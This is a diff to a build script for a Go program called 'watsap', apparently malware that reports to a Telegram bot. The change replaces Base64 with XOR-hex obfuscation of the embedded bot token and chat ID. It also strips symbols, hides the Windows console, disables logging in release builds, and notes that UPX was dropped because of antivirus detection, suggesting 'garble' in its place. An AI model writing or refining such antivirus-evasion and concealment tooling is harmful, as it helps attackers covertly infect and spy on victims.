@@ -115,24 +115,38 @@ read -r -p "Choice [1-2]: " build_type
 log_info "Switching to source directory: $SOURCE_DIR"
 cd "$SOURCE_DIR" || exit
 
-# Inject environment variables into the binary (Base64 Encoded for basic obfuscation)
-ENC_BOT_TOKEN=$(echo -n "$TG_BOT_TOKEN" | base64)
-ENC_CHAT_ID=$(echo -n "$TG_CHAT_ID" | base64)
+# Inject environment variables into the binary (XOR Encoded for better obfuscation)
+# We will use a simple fixed XOR key 'W' (0x57) and output as hex to avoid null bytes/parsing issues.
+function xor_hex() {
+    local input="$1"
+    local output=""
+    for (( i=0; i<${#input}; i++ )); do
+        local char="${input:$i:1}"
+        local ascii_val=$(printf "%d" "'$char")
+        local xor_val=$(( ascii_val ^ 0x57 ))
+        output+=$(printf "%02x" "$xor_val")
+    done
+    echo "$output"
+}
 
-BASE_LDFLAGS="-X 'watsap/utils/config.TG_BOT_TOKEN=$ENC_BOT_TOKEN' -X 'watsap/utils/config.TG_CHAT_ID=$ENC_CHAT_ID'"
+ENC_BOT_TOKEN=$(xor_hex "$TG_BOT_TOKEN")
+ENC_CHAT_ID=$(xor_hex "$TG_CHAT_ID")
+
+BASE_LDFLAGS="-X 'watsap/utils/config.TG_BOT_TOKEN_HEX=$ENC_BOT_TOKEN' -X 'watsap/utils/config.TG_CHAT_ID_HEX=$ENC_CHAT_ID'"
 
 if [[ "$build_type" == "1" ]]; then
     # === RELEASE MODE ===
     log_info "Building RELEASE version ($GOARCH)..."
+    RELEASE_LDFLAGS="$BASE_LDFLAGS -X 'watsap/utils/config.DEBUG_STATUS=false' -X 'watsap/utils/config.LOG_STATUS=false' -s -w"
 
     # Linux Build (-s -w strips symbols)
     CGO_ENABLED=0 GOOS=linux GOARCH="$GOARCH" go build \
-        -ldflags "$BASE_LDFLAGS -s -w" \
+        -ldflags "$RELEASE_LDFLAGS" \
         -o "$DIST_DIR/watsap-linux-$GOARCH.bin" .
 
     # Windows Build (-H=windowsgui hides console)
     CGO_ENABLED=0 GOOS=windows GOARCH="$GOARCH" go build \
-        -ldflags "$BASE_LDFLAGS -s -w -H=windowsgui" \
+        -ldflags "$RELEASE_LDFLAGS -H=windowsgui" \
         -o "$DIST_DIR/watsap-windows-$GOARCH.exe" .
 
     log_warn "UPX compression has been disabled due to high AV detection rates. Consider using 'garble' for obfuscation."
@@ -140,13 +154,14 @@ if [[ "$build_type" == "1" ]]; then
 else
     # === DEBUG MODE ===
     log_info "Building DEBUG version ($GOARCH)..."
+    DEBUG_LDFLAGS="$BASE_LDFLAGS -X 'watsap/utils/config.DEBUG_STATUS=true' -X 'watsap/utils/config.LOG_STATUS=true'"
 
     CGO_ENABLED=0 GOOS=linux GOARCH="$GOARCH" go build \
-        -ldflags "$BASE_LDFLAGS" \
+        -ldflags "$DEBUG_LDFLAGS" \
         -o "$DIST_DIR/watsap-linux-$GOARCH-debug.bin" .
 
     CGO_ENABLED=0 GOOS=windows GOARCH="$GOARCH" go build \
-        -ldflags "$BASE_LDFLAGS" \
+        -ldflags "$DEBUG_LDFLAGS" \
         -o "$DIST_DIR/watsap-windows-$GOARCH-debug.exe" .
 fi
 
